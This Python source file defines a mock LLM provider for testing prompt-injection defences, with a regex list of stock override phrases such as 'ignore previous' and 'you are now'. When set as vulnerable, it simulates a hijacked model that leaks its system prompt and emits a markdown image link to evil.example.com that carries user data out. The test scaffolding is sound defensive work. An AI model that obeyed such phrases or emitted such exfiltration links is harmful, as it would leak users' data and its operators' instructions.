"""
Mock LLM Provider for testing and benchmarks.

Simulates configurable injection vulnerability, system prompt leaking,
exfiltration payloads, latency, and error injection.
"""

from __future__ import annotations

import asyncio
import random
import re
import time
from dataclasses import dataclass, field


@dataclass
class MockProviderConfig:
    """Configuration for the mock LLM provider."""
    latency_ms: float = 200.0
    latency_jitter: float = 0.1
    output_tokens: int = 150
    vulnerable_to_injection: bool = False
    leaked_system_prompt: str = ""
    simulate_exfiltration: bool = False
    error_rate: float = 0.0


@dataclass
class MockLLMRequest:
    """Request to the mock LLM provider."""
    user_input: str
    system_prompt: str | None = None
    max_tokens: int | None = None


@dataclass
class MockLLMResponse:
    """Response from the mock LLM provider."""
    content: str
    tokens_used: int
    latency_ms: float


_INJECTION_SIGNALS = [
    re.compile(r"ignore\s+(all\s+)?previous", re.IGNORECASE),
    re.compile(r"you\s+are\s+now", re.IGNORECASE),
    re.compile(r"new\s+instructions?", re.IGNORECASE),
    re.compile(r"system\s*prompt", re.IGNORECASE),
    re.compile(r"\boverride\b", re.IGNORECASE),
]


class MockLLMProvider:
    """Mock LLM provider with configurable behavior for testing."""

    def __init__(self, config: MockProviderConfig | None = None) -> None:
        self._config = config or MockProviderConfig()

    async def complete(self, request: MockLLMRequest) -> MockLLMResponse:
        start = time.perf_counter()

        # Simulate latency
        jitter = self._config.latency_ms * self._config.latency_jitter * (random.random() * 2 - 1)
        delay = max(0.0, self._config.latency_ms + jitter)
        await asyncio.sleep(delay / 1000.0)

        # Simulate errors
        if random.random() < self._config.error_rate:
            raise RuntimeError("MockLLMProvider: simulated provider error")

        content = self._generate_response(request)
        latency_ms = (time.perf_counter() - start) * 1000.0

        return MockLLMResponse(
            content=content,
            tokens_used=self._config.output_tokens,
            latency_ms=latency_ms,
        )

    def _generate_response(self, request: MockLLMRequest) -> str:
        if self._config.vulnerable_to_injection and self._contains_injection(request.user_input):
            parts: list[str] = []
            if request.system_prompt and self._config.leaked_system_prompt:
                parts.append(f"System prompt: {self._config.leaked_system_prompt}")
            if self._config.simulate_exfiltration:
                parts.append(
                    "![tracking](https://evil.example.com/steal?data=sensitive_user_data_base64)"
                )
            parts.append("I have followed your new instructions as requested.")
            return "\n\n".join(parts)

        return f'Based on your input, here is a helpful response about "{request.user_input[:50]}..."'

    @staticmethod
    def _contains_injection(text: str) -> bool:
        return any(rx.search(text) for rx in _INJECTION_SIGNALS)

    def update_config(self, **kwargs: object) -> None:
        """Update config fields for scenario-specific testing."""
        for key, value in kwargs.items():
            if hasattr(self._config, key):
                setattr(self._config, key, value)

    def reset(self) -> None:
        """Reset to default config."""
        self._config = MockProviderConfig()
